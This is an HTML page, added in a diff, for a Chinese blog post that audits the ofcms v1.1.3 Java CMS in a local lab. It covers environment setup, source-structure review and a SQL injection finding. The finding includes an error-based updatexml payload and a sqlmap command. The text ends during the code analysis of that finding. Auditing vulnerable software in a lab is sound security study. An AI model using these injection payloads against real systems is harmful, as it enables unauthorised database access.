@@ -1,0 +1,549 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="一、前言该文章结合了之前审计时学习到的知识点，参考已有的文章，虽然该源码初步学习审计起来并不算困难，但距离独自审计还有一段距离，该 CMS 作为入门审计项目，对新手还算比较友好。当然该 CMS 还有其它漏洞点还没有进行审计学习，后续有时间再补充。 二、环境搭建1、导入源码，重新加载项目，源码地址：  配置 Tomcat 环境  修改数据库连接环境 ofcms\ofcms-admin\src\mai">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java代码审计(四)-ofcms v1.1.3">
+<meta property="og:url" content="http://example.com/2022/10/21/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E5%9B%9B)-ofcms-v1-1-3/index.html">
+<meta property="og:site_name" content="世间闲客·此闲行">
+<meta property="og:description" content="一、前言该文章结合了之前审计时学习到的知识点，参考已有的文章，虽然该源码初步学习审计起来并不算困难，但距离独自审计还有一段距离，该 CMS 作为入门审计项目，对新手还算比较友好。当然该 CMS 还有其它漏洞点还没有进行审计学习，后续有时间再补充。 二、环境搭建1、导入源码，重新加载项目，源码地址：  配置 Tomcat 环境  修改数据库连接环境 ofcms\ofcms-admin\src\mai">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/Java/ofcms/image-20221019230013447.png">
+<meta property="og:image" content="http://example.com/images/Java/ofcms/image-20221019230108972.png">
+<meta property="og:image" content="http://example.com/images/Java/ofcms/image-20221019230232755.png">
+<meta property="og:image" content="http://example.com/images/Java/ofcms/image-20221019230249450.png">
+<meta property="og:image" content="http://example.com/images/Java/ofcms/image-20221019230312244.png">
+<meta property="og:image" content="http://example.com/images/Java/ofcms/image-20221019230547219.png">
+<meta property="og:image" content="http://example.com/images/Java/ofcms/image-20221019230724781.png">
+<meta property="og:image" content="http://example.com/images/Java/ofcms/image-20221019230853811.png">
+<meta property="og:image" content="http://example.com/images/Java/ofcms/image-20221019231020331.png">
+<meta property="og:image" content="http://example.com/images/Java/ofcms/image-20221019231045182.png">
+<meta property="og:image" content="http://example.com/images/Java/ofcms/image-20221019231159805.png">
+<meta property="og:image" content="http://example.com/images/Java/ofcms/image-20221019231216862.png">
+<meta property="og:image" content="http://example.com/images/Java/ofcms/image-20221019231304504.png">
+<meta property="og:image" content="http://example.com/images/Java/ofcms/image-20221019231707919.png">
+<meta property="og:image" content="http://example.com/images/Java/ofcms/image-20221019231757207.png">
+<meta property="og:image" content="http://example.com/images/Java/ofcms/image-20221019231916420.png">
+<meta property="og:image" content="http://example.com/images/Java/ofcms/image-20221019232009809.png">
+<meta property="og:image" content="http://example.com/images/Java/ofcms/image-20221019232111734.png">
+<meta property="og:image" content="http://example.com/images/Java/ofcms/image-20221019232345630.png">
+<meta property="og:image" content="http://example.com/images/Java/ofcms/image-20221019232502415.png">
+<meta property="og:image" content="http://example.com/images/Java/ofcms/image-20221019232519216.png">
+<meta property="og:image" content="http://example.com/images/Java/ofcms/image-20221020010225802.png">
+<meta property="og:image" content="http://example.com/images/Java/ofcms/image-20221020010344368.png">
+<meta property="og:image" content="http://example.com/images/Java/ofcms/image-20221020010007868.png">
+<meta property="og:image" content="http://example.com/images/Java/ofcms/image-20221020010940740.png">
+<meta property="og:image" content="http://example.com/images/Java/ofcms/image-20221020011132305.png">
+<meta property="og:image" content="http://example.com/images/Java/ofcms/image-20221020011211309.png">
+<meta property="og:image" content="http://example.com/images/Java/ofcms/image-20221020012651194.png">
+<meta property="og:image" content="http://example.com/images/Java/ofcms/image-20221020015034179.png">
+<meta property="og:image" content="http://example.com/images/Java/ofcms/image-20221020015121559.png">
+<meta property="og:image" content="http://example.com/images/Java/ofcms/image-20221020000529612.png">
+<meta property="og:image" content="http://example.com/images/Java/ofcms/image-20221020000923745.png">
+<meta property="og:image" content="http://example.com/images/Java/ofcms/image-20221020021417891.png">
+<meta property="og:image" content="http://example.com/images/Java/ofcms/image-20221020020122144.png">
+<meta property="og:image" content="http://example.com/images/Java/ofcms/image-20221020020637848.png">
+<meta property="og:image" content="http://example.com/images/Java/ofcms/image-20221020020851984.png">
+<meta property="og:image" content="http://example.com/images/Java/ofcms/image-20221020021029645.png">
+<meta property="og:image" content="http://example.com/images/Java/ofcms/image-20221020020851984.png">
+<meta property="og:image" content="http://example.com/images/Java/ofcms/image-20221020021928106.png">
+<meta property="og:image" content="http://example.com/images/Java/ofcms/image-20221020022215661.png">
+<meta property="og:image" content="http://example.com/images/Java/ofcms/image-20221020022414193.png">
+<meta property="og:image" content="http://example.com/images/Java/ofcms/image-20221021000447406.png">
+<meta property="og:image" content="http://example.com/images/Java/ofcms/image-20221021002005057.png">
+<meta property="og:image" content="http://example.com/images/Java/ofcms/image-20221021003322351.png">
+<meta property="og:image" content="http://example.com/images/Java/ofcms/image-20221021002215557.png">
+<meta property="og:image" content="http://example.com/images/Java/ofcms/image-20221021002555604.png">
+<meta property="og:image" content="http://example.com/images/Java/ofcms/image-20221021002943097.png">
+<meta property="og:image" content="http://example.com/images/Java/ofcms/image-20221021005342147.png">
+<meta property="og:image" content="http://example.com/images/Java/ofcms/image-20221021012934815.png">
+<meta property="og:image" content="http://example.com/images/Java/ofcms/image-20221021014155077.png">
+<meta property="og:image" content="http://example.com/images/Java/ofcms/image-20221021014135817.png">
+<meta property="og:image" content="http://example.com/images/Java/ofcms/image-20221021012311523.png">
+<meta property="og:image" content="http://example.com/images/Java/ofcms/image-20221021012141523.png">
+<meta property="og:image" content="http://example.com/images/Java/ofcms/image-20221021012506146.png">
+<meta property="og:image" content="http://example.com/images/Java/ofcms/image-20221021020833483.png">
+<meta property="og:image" content="http://example.com/images/Java/ofcms/image-20221021021122226.png">
+<meta property="og:image" content="http://example.com/images/Java/ofcms/image-20221021021309015.png">
+<meta property="og:image" content="http://example.com/images/Java/ofcms/image-20221021022029123.png">
+<meta property="og:image" content="http://example.com/images/Java/ofcms/image-20221021022429063.png">
+<meta property="og:image" content="http://example.com/images/Java/ofcms/image-20221021033127359.png">
+<meta property="og:image" content="http://example.com/images/Java/ofcms/image-20221021033310849.png">
+<meta property="og:image" content="http://example.com/images/Java/ofcms/image-20221021034750952.png">
+<meta property="og:image" content="http://example.com/images/Java/ofcms/image-20221021034529451.png">
+<meta property="og:image" content="http://example.com/images/Java/ofcms/image-20221021040448644.png">
+<meta property="article:published_time" content="2022-10-20T20:23:36.000Z">
+<meta property="article:modified_time" content="2022-10-26T14:07:00.000Z">
+<meta property="article:author" content="Funsiooo">
+<meta property="article:tag" content="Java代码审计">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/Java/ofcms/image-20221019230013447.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/logo-1.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/logo-1.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/logo-1.png">
+        
+      
+    
+    <!-- title -->
+    <title>Java代码审计(四)-ofcms v1.1.3</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.css" />
+
+<meta name="generator" content="Hexo 5.4.2"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+<body class="max-width mx-auto px3 ">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2022/10/22/WEB%E6%BC%8F%E6%B4%9E%E7%B3%BB%E5%88%97-JWT%E6%94%BB%E5%87%BB%E6%89%8B%E6%AE%B5%E8%80%83%E7%A9%B6/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2022/10/16/Web%20Service%20%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95%E4%B9%8B%20SOAP/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/10/21/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E5%9B%9B)-ofcms-v1-1-3/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/10/21/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E5%9B%9B)-ofcms-v1-1-3/&text=Java代码审计(四)-ofcms v1.1.3"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/10/21/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E5%9B%9B)-ofcms-v1-1-3/&title=Java代码审计(四)-ofcms v1.1.3"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/10/21/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E5%9B%9B)-ofcms-v1-1-3/&is_video=false&description=Java代码审计(四)-ofcms v1.1.3"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Java代码审计(四)-ofcms v1.1.3&body=Check out this article: http://example.com/2022/10/21/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E5%9B%9B)-ofcms-v1-1-3/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/10/21/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E5%9B%9B)-ofcms-v1-1-3/&title=Java代码审计(四)-ofcms v1.1.3"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/10/21/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E5%9B%9B)-ofcms-v1-1-3/&title=Java代码审计(四)-ofcms v1.1.3"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/10/21/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E5%9B%9B)-ofcms-v1-1-3/&title=Java代码审计(四)-ofcms v1.1.3"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/10/21/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E5%9B%9B)-ofcms-v1-1-3/&title=Java代码审计(四)-ofcms v1.1.3"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/10/21/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E5%9B%9B)-ofcms-v1-1-3/&name=Java代码审计(四)-ofcms v1.1.3&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/10/21/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E5%9B%9B)-ofcms-v1-1-3/&t=Java代码审计(四)-ofcms v1.1.3"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">一、前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.</span> <span class="toc-text">二、环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">3.</span> <span class="toc-text">三、代码审计</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">3.1.</span> <span class="toc-text">1、源码分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1"><span class="toc-number">3.2.</span> <span class="toc-text">2、漏洞审计</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">3.2.1.</span> <span class="toc-text">SQL注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SSTI%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5"><span class="toc-number">3.2.2.</span> <span class="toc-text">SSTI服务器模板注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5"><span class="toc-number">3.2.3.</span> <span class="toc-text">任意文件写入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">3.2.4.</span> <span class="toc-text">任意文件上传</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">4.</span> <span class="toc-text">四、参考文章</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Java代码审计(四)-ofcms v1.1.3
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Funsiooo</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-10-20T20:23:36.000Z" itemprop="datePublished">2022-10-21</time>
+        
+        (Updated: <time datetime="2022-10-26T14:07:00.000Z" itemprop="dateModified">2022-10-26</time>)
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">Java代码审计</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>该文章结合了之前审计时学习到的知识点，参考已有的文章，虽然该源码初步学习审计起来并不算困难，但距离独自审计还有一段距离，该 CMS 作为入门审计项目，对新手还算比较友好。当然该 CMS 还有其它漏洞点还没有进行审计学习，后续有时间再补充。</p>
+<h2 id="二、环境搭建"><a href="#二、环境搭建" class="headerlink" title="二、环境搭建"></a>二、环境搭建</h2><p>1、<a target="_blank" rel="noopener" href="https://github.com/Funsiooo/Vuln_Bulid">导入源码</a>，重新加载项目，源码地址：</p>
+<p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221019230013447.png" data-caption="image-20221019230013447"><img src="/../images/Java/ofcms/image-20221019230013447.png" alt="image-20221019230013447"></a></p>
+<p>配置 Tomcat 环境</p>
+<p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221019230108972.png" data-caption="image-20221019230108972"><img src="/../images/Java/ofcms/image-20221019230108972.png" alt="image-20221019230108972"></a><br><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221019230232755.png" data-caption="image-20221019230232755"><img src="/../images/Java/ofcms/image-20221019230232755.png" alt="image-20221019230232755"></a><br><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221019230249450.png" data-caption="image-20221019230249450"><img src="/../images/Java/ofcms/image-20221019230249450.png" alt="image-20221019230249450"></a><br><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221019230312244.png" data-caption="image-20221019230312244"><img src="/../images/Java/ofcms/image-20221019230312244.png" alt="image-20221019230312244"></a></p>
+<p>修改数据库连接环境 <code>ofcms\ofcms-admin\src\main\resources\dev\conf\db-config.properties</code></p>
+<p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221019230547219.png" data-caption="image-20221019230547219"><img src="/../images/Java/ofcms/image-20221019230547219.png" alt="image-20221019230547219"></a></p>
+<p><code>path</code> 必须修改为系统可访问的路径，由于我自己环境为虚拟机，只有C盘，所以出现报错，若在真实环境下带d盘则不用理会</p>
+<p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221019230724781.png" data-caption="image-20221019230724781"><img src="/../images/Java/ofcms/image-20221019230724781.png" alt="image-20221019230724781"></a><br><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221019230853811.png" data-caption="image-20221019230853811"><img src="/../images/Java/ofcms/image-20221019230853811.png" alt="image-20221019230853811"></a></p>
+<p>运行启动环境，点击右上角运行符号即可</p>
+<p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221019231020331.png" data-caption="image-20221019231020331"><img src="/../images/Java/ofcms/image-20221019231020331.png" alt="image-20221019231020331"></a></p>
+<p>运行成功后会自动弹出安装界面</p>
+<p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221019231045182.png" data-caption="image-20221019231045182"><img src="/../images/Java/ofcms/image-20221019231045182.png" alt="image-20221019231045182"></a></p>
+<p>点击下一步会出现报错，需要将访问地址改为 <code>http://本地IP:端口/项目路径</code></p>
+<p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221019231159805.png" data-caption="image-20221019231159805"><img src="/../images/Java/ofcms/image-20221019231159805.png" alt="image-20221019231159805"></a><br><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221019231216862.png" data-caption="image-20221019231216862"><img src="/../images/Java/ofcms/image-20221019231216862.png" alt="image-20221019231216862"></a></p>
+<p>这里的数据库环境依旧使用phpstudy</p>
+<p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221019231304504.png" data-caption="image-20221019231304504"><img src="/../images/Java/ofcms/image-20221019231304504.png" alt="image-20221019231304504"></a></p>
+<p>输入数据库密码进入下一步，需要创建一个空的，名为 <code>ofcms</code> 的数据库</p>
+<p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221019231707919.png" data-caption="image-20221019231707919"><img src="/../images/Java/ofcms/image-20221019231707919.png" alt="image-20221019231707919"></a><br><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221019231757207.png" data-caption="image-20221019231757207"><img src="/../images/Java/ofcms/image-20221019231757207.png" alt="image-20221019231757207"></a><br><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221019231916420.png" data-caption="image-20221019231916420"><img src="/../images/Java/ofcms/image-20221019231916420.png" alt="image-20221019231916420"></a></p>
+<p>接下来就系重点了，就是这个无限重装bug搞了我很久，因为如果按照提示重启web容器（idea run），依然会进入安装界面</p>
+<p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221019232009809.png" data-caption="image-20221019232009809"><img src="/../images/Java/ofcms/image-20221019232009809.png" alt="image-20221019232009809"></a></p>
+<p>这里需要修改数据库连接配置文件名，将 <code>db-config</code> 改为 <code>db</code>,之前因为连接数据库的 IP 地址填为本地 IP 地址 <code>192.x.x.x</code>，这样修改 <code>db-config</code> 为 <code>db</code> 则会报错，修改为 <code>localhost</code> 才不会报错</p>
+<p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221019232111734.png" data-caption="image-20221019232111734"><img src="/../images/Java/ofcms/image-20221019232111734.png" alt="image-20221019232111734"></a><br><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221019232345630.png" data-caption="image-20221019232345630"><img src="/../images/Java/ofcms/image-20221019232345630.png" alt="image-20221019232345630"></a></p>
+<p>成功搭建</p>
+<p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221019232502415.png" data-caption="image-20221019232502415"><img src="/../images/Java/ofcms/image-20221019232502415.png" alt="image-20221019232502415"></a><br><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221019232519216.png" data-caption="image-20221019232519216"><img src="/../images/Java/ofcms/image-20221019232519216.png" alt="image-20221019232519216"></a></p>
+<p>小结：这一部分的环境搭建坑点很多，主要还是卡在一些小细节。注意，解决重装bug记得要先把数据库连接地址改为 <code>localhost</code>（重要），然后安装一遍，让数据库生成相应的表格，然后将<code>db-config.properties</code> 改为 <code>db.properties</code>，然后重新运行即可。</p>
+<h2 id="三、代码审计"><a href="#三、代码审计" class="headerlink" title="三、代码审计"></a>三、代码审计</h2><h3 id="1、源码分析"><a href="#1、源码分析" class="headerlink" title="1、源码分析"></a>1、源码分析</h3><p>开始审计前，大概了解程序框架，整个程序一共有五个模块组成，根据  <code>Readme</code> 可知其对应的作用</p>
+<p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221020010225802.png" data-caption="image-20221020010225802"><img src="/../images/Java/ofcms/image-20221020010225802.png" alt="image-20221020010225802"></a><br><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221020010344368.png" data-caption="image-20221020010344368"><img src="/../images/Java/ofcms/image-20221020010344368.png" alt="image-20221020010344368"></a></p>
+<p>然后，我们查看 <code>pom.xml</code> ,<code>&lt;dependencies&gt;</code> 部分，即依赖。分析其程序使用了哪些框架，或应用版本是哪些，对我们后续审计有一定的作用。如下为 <code>ofcms v1.1.3</code> <code>pom.xml</code>文件，依赖如下，由信息可知程序信息有 <code>jfinal</code> 框架、<code>slf4j</code> 日志框架、<code>Apache</code> 中间件、<code>springframework</code> 框架、<code>Druid 1.0.5</code>、<code>fastjson 1.1.41</code>、<code>log4j 1.2.16</code>、<code>mysql 5.1.47</code>等信息，后续也可以对该程序进行已知漏洞的测试</p>
+<p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221020010007868.png" data-caption="image-20221020010007868"><img src="/../images/Java/ofcms/image-20221020010007868.png" alt="image-20221020010007868"></a></p>
+<p>通过查看源码得知，程序使用了 <code>tomcat</code> ，而代码对应存在 <code>web.xml</code> 配置文件，我们分析其配置文件，看有没有其它的信息。例子：通过 <code>web.xml</code> 得知 <code>druid</code> 路径为 <code>/admin/druid/</code>,若存在未授权则可以访问，但 <code>admin</code> 路径为后台路径，所以需要登录才能访问</p>
+<p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221020010940740.png" data-caption="image-20221020010940740"><img src="/../images/Java/ofcms/image-20221020010940740.png" alt="image-20221020010940740"></a></p>
+<p>尝试访问 <code>/admin/druid/*</code>，跳转至登录页面</p>
+<p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221020011132305.png" data-caption="image-20221020011132305"><img src="/../images/Java/ofcms/image-20221020011132305.png" alt="image-20221020011132305"></a></p>
+<p>登录后访问。这只是一个例子，通过配置文件找寻一些有用的信息</p>
+<p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221020011211309.png" data-caption="image-20221020011211309"><img src="/../images/Java/ofcms/image-20221020011211309.png" alt="image-20221020011211309"></a></p>
+<p>然后我们通过一下源码，大概了解程序结构，以及相应代码文件夹的源码作用是哪些，一般我们查看文件夹下的 <code>/src/java</code> 目录下的源码即可。<code>Controller</code> 源码对应 <code>resources</code>，我们可以通过 <code>Controller</code> 分析其请求状况，然后到 <code>resources</code> 中查看其具体代码。</p>
+<p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221020012651194.png" data-caption="image-20221020012651194"><img src="/../images/Java/ofcms/image-20221020012651194.png" alt="image-20221020012651194"></a></p>
+<p>最后，每个代码页面浏览一下，通过代码结构和注释等信息了解大概的结构。基本知识点请移步站内文章<a target="_blank" rel="noopener" href="https://funsiooo.github.io/2022/10/02/JAVA%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E4%B8%89)-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86">《JAVA代码审计(三)-基础知识》</a></p>
+<h3 id="2、漏洞审计"><a href="#2、漏洞审计" class="headerlink" title="2、漏洞审计"></a>2、漏洞审计</h3><h4 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h4><p>这里使用白盒测试，通过分析后测试漏洞点，<code>后台-》代码生成-》</code>,随便输入字符，报错</p>
+<p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221020015034179.png" data-caption="image-20221020015034179"><img src="/../images/Java/ofcms/image-20221020015034179.png" alt="image-20221020015034179"></a></p>
+<p>为了显示得更直观，这里利用 Burp 抓包</p>
+<p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221020015121559.png" data-caption="image-20221020015121559"><img src="/../images/Java/ofcms/image-20221020015121559.png" alt="image-20221020015121559"></a></p>
+<p>验证测试 payload：<br><code>update+of_cms_link+set+link_name%3dupdatexml(1,concat(0x7e,(user())),0)+where+link_id+%3d+4</code></p>
+<p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221020000529612.png" data-caption="image-20221020000529612"><img src="/../images/Java/ofcms/image-20221020000529612.png" alt="image-20221020000529612"></a></p>
+<p>简单复现，祭出神器 Sqlmap  <code>python sqlmap.py -r ofcms.txt -p sql --level 3 --dbs</code></p>
+<p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221020000923745.png" data-caption="image-20221020000923745"><img src="/../images/Java/ofcms/image-20221020000923745.png" alt="image-20221020000923745"></a></p>
+<p>漏洞分析，定位漏洞位置源码。通过 Burp 中发现 <code>referer 中system/generate</code>，源码中定位该代码文件</p>
+<p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221020021417891.png" data-caption="image-20221020021417891"><img src="/../images/Java/ofcms/image-20221020021417891.png" alt="image-20221020021417891"></a><br><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221020020122144.png" data-caption="image-20221020020122144"><img src="/../images/Java/ofcms/image-20221020020122144.png" alt="image-20221020020122144"></a></p>
+<p>全局搜索，定位代码位置<br><code>\ofcms\ofcms-admin\src\main\java\com\ofsoft\cms\admin\controller\system\SystemGenerateController.java</code></p>
+<p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221020020637848.png" data-caption="image-20221020020637848"><img src="/../images/Java/ofcms/image-20221020020637848.png" alt="image-20221020020637848"></a></p>
+<p>其中通过分析代码，发现漏洞点参数 <code>sql</code></p>
+<p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221020020851984.png" data-caption="image-20221020020851984"><img src="/../images/Java/ofcms/image-20221020020851984.png" alt="image-20221020020851984"></a></p>
